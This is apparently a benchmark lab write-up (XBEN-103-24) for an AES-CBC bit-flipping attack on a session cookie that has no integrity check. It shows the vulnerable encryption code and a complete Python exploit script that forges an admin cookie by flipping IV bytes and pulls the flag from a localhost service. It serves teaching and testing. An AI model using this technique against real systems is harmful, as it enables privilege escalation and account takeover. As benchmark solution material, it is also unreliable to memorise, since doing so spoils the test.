# XBEN-103-24 — Trusty Cookie — AES-CBC Bit-Flipping (No MAC)

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Cryptographic failure — session cookie privilege escalation. The session cookie
is `hex(IV || AES-CBC-ciphertext)` of the plaintext username, with **no MAC / integrity check**.
Because CBC decryption XORs the decrypted first ciphertext block with the IV
(`P1 = D(C1) XOR IV`), an attacker who controls the IV (it's sent in the cookie, in the clear)
can flip arbitrary bits of the **first plaintext block** without knowing the AES key. Since
`"test1"` and `"admin"` are both 5 bytes, XOR-ing the right bytes of the IV with
`"test1" XOR "admin"` turns a legitimately-issued `test1` session into an `admin` session.

## Root cause (app/app.py)

```python
def encrypt_data(data):
    iv = os.urandom(16)
    padded_data = data.encode() + b'\x00' * padding_length
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    ct = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ct                       # cookie = IV || ciphertext, no MAC
```

## Exploit (copy-pasteable, port substituted for this run: 55334)

The three steps — (1) log in as `test1`/`test1` and capture the freshly issued session cookie,
(2) bit-flip the first `len("test1")` IV bytes so the decrypted first block becomes `admin`
(each login issues a random IV, so the cookie must be captured live, not hardcoded), and
(3) replay the forged cookie to `/welcome` — are wired together in one self-contained script so
the forged IV always matches the ciphertext of the current session:

```python
import re
import requests

PORT = 55334
base = f"http://localhost:{PORT}"

# 1. Log in as test1 and capture the live session cookie (random IV each time).
issued = requests.post(
    f"{base}/login", data={"username": "test1", "password": "test1"}, allow_redirects=False
).cookies["session"]

# 2. CBC bit-flip: P1 = D(C1) XOR IV, so XOR-ing the IV with ("test1" XOR "admin")
#    rewrites the first plaintext block without the AES key.
data = bytes.fromhex(issued)
iv, ct = bytearray(data[:16]), data[16:]
for i, (p, t) in enumerate(zip(b"test1", b"admin")):
    iv[i] ^= p ^ t
forged = (bytes(iv) + ct).hex()

# 3. Replay the forged cookie to the admin-only page.
body = requests.get(f"{base}/welcome", cookies={"session": forged}).text
print(re.search(r"FLAG\{[a-f0-9]+\}", body).group(0))
```
